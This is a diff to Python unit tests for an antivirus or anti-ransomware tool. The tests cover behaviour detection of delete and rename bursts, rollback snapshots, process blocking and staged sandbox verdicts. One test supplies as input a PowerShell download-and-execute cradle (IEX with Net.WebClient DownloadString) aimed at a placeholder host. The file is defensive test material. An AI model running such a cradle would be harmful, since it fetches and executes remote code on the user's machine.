@@ -10,14 +10,24 @@ from datetime import datetime, timedelta, timezone
 from pathlib import Path
 from unittest.mock import patch
 
-os.environ.setdefault("RAGNAR_APP_DIR", str(Path(tempfile.gettempdir()) / "ragnar-protect-tests"))
+os.environ["RAGNAR_APP_DIR"] = tempfile.mkdtemp(prefix="ragnar-protect-tests-")
 
 from ragnar_protect.behavior_engine import BehaviorCorrelationEngine
 from ragnar_protect.canary_guard import CanaryGuard
 from ragnar_protect.cloud_reputation import CloudReputationClient
+from ragnar_protect.config import is_managed_path
 from ragnar_protect.database import Database
 from ragnar_protect.hidden_process import _apply_hidden_windows_kwargs
-from ragnar_protect.models import FileScanResult, IsolatedExecutionReport, SandboxExecutionReport, ScanFinding, WatchedFileState
+from ragnar_protect.blocker import ProcessBlocker
+from ragnar_protect.models import (
+    FileScanResult,
+    IsolatedExecutionReport,
+    LaunchDecision,
+    SandboxExecutionReport,
+    ScanFinding,
+    StageVerdict,
+    WatchedFileState,
+)
 from ragnar_protect.process_guard import ProcessGuard
 from ragnar_protect.sandbox_queue import SandboxQueue
 from ragnar_protect.staged_analysis import StagePipeline
@@ -144,6 +154,9 @@ class _FakeLaunchScanner:
     def count_strong_confirmations(self, result: FileScanResult) -> int:
         return 0
 
+    def is_low_signal_packed_pe_result(self, result: FileScanResult) -> bool:
+        return True
+
     def enforce_block_on_existing_file(self, file_path: Path | str, result: FileScanResult) -> dict[str, object]:
         return {"blocked": True, "quarantined_path": "", "quarantine_item_id": None}
 
@@ -206,12 +219,47 @@ class _FakeLaunchProc:
         self.resumed = True
 
 
+class _FakeProcWithoutInfo:
+    def __init__(self, pid: int, exe_path: str, cmdline: list[str]) -> None:
+        self.pid = pid
+        self._exe = exe_path
+        self._cmdline = list(cmdline)
+        self._name = Path(exe_path).name
+        self._create_time = time.time()
+
+    def name(self) -> str:
+        return self._name
+
+    def exe(self) -> str:
+        return self._exe
+
+    def cmdline(self) -> list[str]:
+        return list(self._cmdline)
+
+    def create_time(self) -> float:
+        return self._create_time
+
+
 class _FakeCanaryGuard:
     def __init__(self, canary_paths: list[str]) -> None:
         self._paths = {str(Path(value)).lower() for value in canary_paths}
 
     def is_canary_path(self, value: str | Path) -> bool:
         return str(Path(value)).lower() in self._paths
+
+
+class _FakeRollbackCache:
+    def __init__(self) -> None:
+        self.snapshots: list[str] = []
+
+    def should_protect(self, path: Path) -> bool:
+        return path.suffix.lower() in {".txt", ".docx", ".xlsx", ".pdf"}
+
+    def snapshot_file(self, path: Path, reason: str = "background") -> str | None:
+        if not path.exists():
+            return None
+        self.snapshots.append(f"{path}|{reason}")
+        return f"C:\\rollback\\{path.name}.bak"
 
 
 class RagnarV2Tests(unittest.TestCase):
@@ -223,7 +271,7 @@ class RagnarV2Tests(unittest.TestCase):
     def tearDown(self) -> None:
         self.temp_dir.cleanup()
 
-    def test_behavior_identified_rename_burst_escalates_stage2(self) -> None:
+    def test_behavior_identified_rename_burst_stays_stage1_without_ransomware_chain(self) -> None:
         engine = BehaviorCorrelationEngine(self.fake_scanner, self.db, watch_manager=None)
         target_dir = Path(self.temp_dir.name) / "Desktop"
         target_dir.mkdir()
@@ -240,9 +288,9 @@ class RagnarV2Tests(unittest.TestCase):
                 )
         incidents = self.db.list_recent_behavior_events(limit=5)
         self.assertTrue(incidents)
-        self.assertEqual(incidents[0]["stage"], "stage2")
+        self.assertEqual(incidents[0]["stage"], "stage1")
         self.assertIn(incidents[0]["incident_type"], {"rename_burst", "encrypted_rename_burst"})
-        kill_mock.assert_called()
+        kill_mock.assert_not_called()
 
     def test_behavior_unattributed_burst_stays_non_destructive(self) -> None:
         engine = BehaviorCorrelationEngine(self.fake_scanner, self.db, watch_manager=None)
@@ -348,6 +396,65 @@ class RagnarV2Tests(unittest.TestCase):
         self.assertEqual(incidents[0]["stage"], "stage2")
         kill_mock.assert_called()
 
+    def test_behavior_delete_burst_escalates_stage2(self) -> None:
+        engine = BehaviorCorrelationEngine(self.fake_scanner, self.db, watch_manager=None)
+        target_dir = Path(self.temp_dir.name) / "Documents"
+        target_dir.mkdir()
+        with patch.object(
+            engine,
+            "_attribute_process",
+            return_value={
+                "pid": 9090,
+                "name": "wiper.exe",
+                "exe": str(target_dir / "wiper.exe"),
+                "confidence": 35,
+                "recent": True,
+                "user_space": True,
+                "child_count": 0,
+                "write_rate": 500_000.0,
+            },
+        ), patch.object(engine, "_kill_and_contain") as kill_mock:
+            for index in range(12):
+                engine._process_event(
+                    {
+                        "event_type": "deleted",
+                        "path": str(target_dir / f"doc{index}.docx"),
+                        "dest_path": None,
+                        "timestamp": time.time(),
+                        "is_directory": False,
+                    }
+                )
+        incidents = self.db.list_recent_behavior_events(limit=5)
+        self.assertTrue(incidents)
+        self.assertEqual(incidents[0]["stage"], "stage2")
+        self.assertIn(incidents[0]["incident_type"], {"delete_burst", "data_delete_burst"})
+        kill_mock.assert_called()
+
+    def test_behavior_preemptive_snapshot_captures_untouched_files(self) -> None:
+        target_dir = Path(self.temp_dir.name) / "Documents"
+        target_dir.mkdir()
+        for name in ("safe1.docx", "safe2.xlsx", "safe3.txt"):
+            (target_dir / name).write_text("payload", encoding="utf-8")
+        rollback = _FakeRollbackCache()
+        engine = BehaviorCorrelationEngine(
+            self.fake_scanner,
+            self.db,
+            watch_manager=None,
+            rollback_cache=rollback,
+        )
+        with patch.object(engine, "_attribute_process", return_value=None):
+            for index in range(4):
+                engine._process_event(
+                    {
+                        "event_type": "moved",
+                        "path": str(target_dir / f"doc{index}.docx"),
+                        "dest_path": str(target_dir / f"doc{index}.lockbit"),
+                        "timestamp": time.time(),
+                        "is_directory": False,
+                    }
+                )
+        self.assertGreaterEqual(len(rollback.snapshots), 1)
+
     def test_watch_manager_auto_unblock_after_three_clean_rescans(self) -> None:
         watch_manager = WatchManager(self.db, self.fake_scanner, interval_seconds=1)
         old_date = (datetime.now(timezone.utc) - timedelta(days=91)).isoformat(timespec="seconds")
@@ -397,6 +504,42 @@ class RagnarV2Tests(unittest.TestCase):
         watch_manager._purge_managed_watch_entries()
 
         self.assertIsNone(self.db.get_watched_file(str(managed_path), "managedhash"))
+
+    def test_is_managed_path_detects_mei_runtime_dlls(self) -> None:
+        bundle_root = Path(self.temp_dir.name) / "_MEI88991"
+        bundle_root.mkdir(parents=True)
+        runtime_dll = bundle_root / "python3.dll"
+        runtime_api_dll = bundle_root / "api-ms-win-crt-stdio-l1-1-0.dll"
+        runtime_dll.write_text("runtime", encoding="utf-8")
+        runtime_api_dll.write_text("runtime", encoding="utf-8")
+        self.assertTrue(is_managed_path(runtime_dll))
+        self.assertTrue(is_managed_path(runtime_api_dll))
+
+    def test_blocker_ignores_managed_runtime_paths(self) -> None:
+        bundle_root = Path(self.temp_dir.name) / "_MEI99887"
+        bundle_root.mkdir(parents=True)
+        managed_exe = bundle_root / "RagnarProtect.exe"
+        managed_exe.write_text("runtime", encoding="utf-8")
+        self.db.upsert_blocked_file(str(managed_exe), "managed-blocked-hash", "test", source="unit")
+        blocker = ProcessBlocker(self.db)
+
+        class _ManagedProc:
+            def __init__(self, exe_path: Path) -> None:
+                self.pid = 9191
+                self.info = {
+                    "pid": self.pid,
+                    "name": "RagnarProtect.exe",
+                    "exe": str(exe_path),
+                }
+
+        with patch("ragnar_protect.blocker.psutil.process_iter", return_value=[_ManagedProc(managed_exe)]), patch.object(
+            blocker,
+            "_terminate_process_tree",
+        ) as terminate_mock:
+            blocker._enforce_blocklist()
+
+        terminate_mock.assert_not_called()
+        self.assertFalse(self.db.is_hash_blocked("managed-blocked-hash"))
 
     def test_cloud_client_rejects_secret_key(self) -> None:
         client = CloudReputationClient(
@@ -475,19 +618,32 @@ class RagnarV2Tests(unittest.TestCase):
         scanner = _FakeLaunchScanner(scan_result)
         guard = ProcessGuard(scanner, self.db)
         proc = _FakeLaunchProc(str(sample))
+        decision = LaunchDecision(
+            path=str(sample),
+            sha256="holdme",
+            action="observe",
+            final_verdict="suspicious",
+            aggregate_score=58,
+            reason="packed executable",
+            stage_verdicts=[StageVerdict(stage="stage3", verdict="suspicious", score=58, summary="aggregate")],
+        )
+        guard.stage_pipeline.native_helper = type("_HelperState", (), {"available": True})()
 
-        with patch.object(guard, "_terminate_process_tree") as terminate_mock:
+        with patch.object(guard, "_terminate_process_tree") as terminate_mock, patch.object(
+            guard.stage_pipeline,
+            "analyze_launch",
+            return_value=(decision, scan_result),
+        ):
             guard._inspect_process(proc, (proc.pid, proc.info["create_time"]), first_seen=True)
 
         queued = self.db.list_sandbox_queue(limit=10)
-        if guard.stage_pipeline.native_helper.available:
-            self.assertEqual(len(queued), 0)
-            self.assertTrue(proc.suspended)
-        else:
-            self.assertEqual(len(queued), 1)
-            self.assertEqual(queued[0]["sha256"], "holdme")
-            self.assertTrue(self.db.is_hash_blocked("holdme"))
-            terminate_mock.assert_called_once()
+        self.assertEqual(len(queued), 1)
+        self.assertEqual(queued[0]["sha256"], "holdme")
+        self.assertEqual(queued[0]["status"], "pending")
+        self.assertTrue(proc.suspended)
+        self.assertTrue(proc.resumed)
+        self.assertFalse(self.db.is_hash_blocked("holdme"))
+        terminate_mock.assert_not_called()
 
     def test_sandbox_clean_report_releases_launch_interceptor_block(self) -> None:
         sample = Path(self.temp_dir.name) / "observe.exe"
@@ -557,6 +713,89 @@ class RagnarV2Tests(unittest.TestCase):
         isolated_mock.assert_any_call(sample, "quick", 6)
         self.assertEqual(decision.action, "kill_quarantine")
         self.assertEqual(result.status, "malicious")
+
+    def test_stage_pipeline_uses_progressive_response_for_single_unconfirmed_sandbox_hit(self) -> None:
+        sample = Path(self.temp_dir.name) / "gray.exe"
+        sample.write_text("gray sample", encoding="utf-8")
+        stage1 = FileScanResult(
+            path=str(sample),
+            sha256="grayhash",
+            size=sample.stat().st_size,
+            extension=".exe",
+            status="suspicious",
+            score=42,
+            findings=[
+                ScanFinding(
+                    kind="pe_upx_sections",
+                    title="UPX sections",
+                    score=30,
+                    description="Packed executable indicators",
+                )
+            ],
+            metadata={"authenticode": {"status": "NotSigned"}},
+        )
+        scanner = _FakeLaunchScanner(stage1)
+        pipeline = StagePipeline(scanner, self.db)
+        quick_report = IsolatedExecutionReport(
+            sample_path=str(sample),
+            mode="quick",
+            verdict="malicious",
+            duration_seconds=4,
+            process_started=True,
+            backend="native-helper",
+            details={"childCount": 1, "droppedExecutableCount": 1, "destructiveToolSeen": False},
+        )
+        deep_report = IsolatedExecutionReport(
+            sample_path=str(sample),
+            mode="deep",
+            verdict="clean",
+            duration_seconds=10,
+            process_started=True,
+            backend="native-helper",
+            details={},
+        )
+
+        with patch.object(pipeline, "_run_isolated", side_effect=[quick_report, deep_report]):
+            decision, result = pipeline.analyze_launch(sample)
+
+        self.assertEqual(decision.action, "observe")
+        self.assertEqual(result.status, "suspicious")
+
+    def test_stage_pipeline_allows_low_signal_packer_after_clean_quick_stage(self) -> None:
+        sample = Path(self.temp_dir.name) / "packed-signed.exe"
+        sample.write_text("packed sample", encoding="utf-8")
+        stage1 = FileScanResult(
+            path=str(sample),
+            sha256="packedclean",
+            size=sample.stat().st_size,
+            extension=".exe",
+            status="suspicious",
+            score=52,
+            findings=[
+                ScanFinding("sensitive_extension", "Sensitive extension", 8, ""),
+                ScanFinding("pe_high_entropy_section", "High entropy section", 16, ""),
+                ScanFinding("pe_packer_heuristic", "Packed executable heuristic", 22, ""),
+                ScanFinding("pe_overlay_stub", "Overlay plus tiny import table", 14, ""),
+            ],
+            metadata={"authenticode": {"status": "Valid"}, "reputation": {"verdict": "unknown"}},
+        )
+        scanner = _FakeLaunchScanner(stage1)
+        pipeline = StagePipeline(scanner, self.db)
+        quick_report = IsolatedExecutionReport(
+            sample_path=str(sample),
+            mode="quick",
+            verdict="clean",
+            duration_seconds=4,
+            process_started=True,
+            backend="native-helper",
+            details={},
+        )
+
+        with patch.object(pipeline, "_run_isolated", return_value=quick_report):
+            decision, result = pipeline.analyze_launch(sample)
+
+        self.assertEqual(decision.action, "allow")
+        self.assertEqual(result.status, "clean")
 
     def test_process_guard_falls_back_to_live_cmdline_for_encoded_powershell(self) -> None:
         payload = "# IEX (New-Object Net.WebClient).DownloadString('http://example')\nStart-Sleep -Seconds 15"
@@ -636,6 +875,32 @@ class RagnarV2Tests(unittest.TestCase):
 
         self.assertEqual(action, "allow")
         self.assertTrue(proc.resumed)
+
+    def test_process_guard_inspect_loop_handles_process_without_info_attribute(self) -> None:
+        scanner = _FakeLaunchScanner(
+            FileScanResult(
+                path="C:\\Users\\Test\\Downloads\\tool.exe",
+                sha256="toolhash",
+                size=0,
+                extension=".exe",
+                status="clean",
+                score=0,
+                findings=[],
+                metadata={},
+            )
+        )
+        guard = ProcessGuard(scanner, self.db)
+        fake_proc = _FakeProcWithoutInfo(
+            8181,
+            "C:\\Users\\Test\\Downloads\\tool.exe",
+            ["C:\\Users\\Test\\Downloads\\tool.exe"],
+        )
+        with patch("ragnar_protect.process_guard.psutil.process_iter", return_value=[fake_proc]), patch.object(
+            guard,
+            "_inspect_process",
+        ) as inspect_mock:
+            guard._inspect_processes()
+        inspect_mock.assert_called_once()
 
     def test_canary_guard_seeds_first_level_subdirectories(self) -> None:
         root = Path(self.temp_dir.name) / "Documents"
